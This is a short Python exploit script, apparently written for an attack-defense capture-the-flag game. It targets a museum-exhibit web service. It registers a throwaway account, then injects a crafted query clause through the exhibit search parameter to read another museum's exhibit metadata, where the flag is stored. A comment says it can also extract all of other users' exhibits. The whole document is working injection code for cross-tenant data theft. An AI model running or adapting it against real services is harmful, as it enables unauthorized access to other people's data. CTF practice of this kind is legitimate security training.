import requests
import sys

def main(IP,PORT,exhibit_id,museum_id):
    api_url = f"http://{IP}:{PORT}/api"
  
    hacker_token = requests.post(
        f"{api_url}/register",
        json={"name": "cool_ha—Üker", "password": "123"}
    ).json()["token"]

    injection_search = f"' AND id = '{exhibit_id}') AT DATABASE ({museum_id})"
    # also can extract all someone else exhibits

    resp = requests.get(
        f"{api_url}/museum/exhibits?search={injection_search}",
        headers={"token": hacker_token},
    ).json()
    print(resp["exhibits"][0]["metadata"])


if __name__ == '__main__':
    ip = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    exhibit_id = flag_id[:36]
    museum_id = flag_id[36:]
    main(ip, port, exhibit_id, museum_id)